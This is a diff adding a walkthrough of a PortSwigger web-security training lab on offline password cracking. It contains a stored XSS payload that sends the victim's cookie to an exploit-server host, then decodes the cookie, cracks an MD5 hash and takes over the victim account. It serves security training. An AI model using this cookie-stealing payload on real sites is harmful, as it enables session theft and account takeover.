@@ -413,3 +413,30 @@ as shown in the SS this is how you create the payload in intruder : base64(usern
 
 
 # 10)Lab: Offline password cracking
+
+Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
+Lab Video: https://www.youtube.com/watch?v=RFt3YbGDkQ4&ab_channel=RanaKhalil
+
+This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
+
+- Your credentials: `wiener:peter`
+- Victim's username: `carlos`
+
+
+ ####  Solution
+
+1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
+2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
+    
+    `username+':'+md5HashOfPassword`
+3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
+4. Go to the exploit server and make a note of the URL.
+5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
+    
+    `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
+6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
+7. Decode the cookie in Burp Decoder. The result will be:
+    
+    `carlos:26323c16d5f4dabff3bb136f2460a943`
+8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
+9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
